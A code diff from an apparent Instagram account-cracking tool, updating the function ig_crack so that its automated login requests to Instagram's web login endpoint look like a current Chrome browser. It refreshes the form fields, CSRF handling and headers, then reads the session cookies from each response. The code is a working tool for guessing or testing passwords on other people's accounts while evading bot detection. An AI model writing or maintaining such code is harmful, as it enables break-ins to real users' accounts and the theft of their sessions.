@@ -236,38 +236,36 @@ def ig_crack(uid, pww, total_idz):
                 'ps_n': '1',
                 'wd': '885x773',}
             data = {
-                "enc_password": enc_password,
-                'optIntoOneTap': 'false',
-                'queryParams': '{"hl":"en"}',
-                'trustedDeviceRecords': '{}',
-                'username': uid,}
+            'enc_password': enc_password,
+            'caaF2DebugGroup': '0',
+            'isPrivacyPortalReq': 'false',
+            'loginAttemptSubmissionCount': '0',
+            'optIntoOneTap': 'false',
+            'queryParams': '{}',
+            'trustedDeviceRecords': '{}',
+            'username': uid,
+            'jazoest': '21799',}
             headers = {
-                'authority': 'www.instagram.com',
-                'accept': '*/*',
-                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://www.instagram.com',
-                'priority': 'u=1, i',
-                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
-                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-model': '""',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-ch-ua-platform-version': '"10.0.0"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': ua,
-                'x-asbd-id': '129477',
-                'x-csrftoken': csrftoken,
-                'x-ig-app-id': '936619743392459',
-                'x-ig-www-claim': '0',
-                'x-instagram-ajax': '1015820104',
-                'x-requested-with': 'XMLHttpRequest',}
-            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
-            response = requests.post(login_url,headers=headers, data=data)
+            'sec-ch-ua-full-version-list': '"Google Chrome";v="143.0.7499.41", "Chromium";v="143.0.7499.41", "Not A(Brand";v="24.0.0.0"',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-mobile': '?0',
+            'X-IG-App-ID': '936619743392459',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Accept': '*/*',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Instagram-AJAX': '1030873649',
+            'X-CSRFToken': csrftoken,
+            'X-Web-Session-ID': '3rqv1q:c1gypo:h32o8c',
+            'Referer': 'https://www.instagram.com/accounts/login/',
+            'X-ASBD-ID': '359341',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+            'X-IG-WWW-Claim': '0',
+            'sec-ch-ua-platform-version': '"10.0.0"',}
+            #login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
+            response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data)
             session_cookies = response.cookies.get_dict()
             if response.status_code == 200:
                 json_response = response.json()
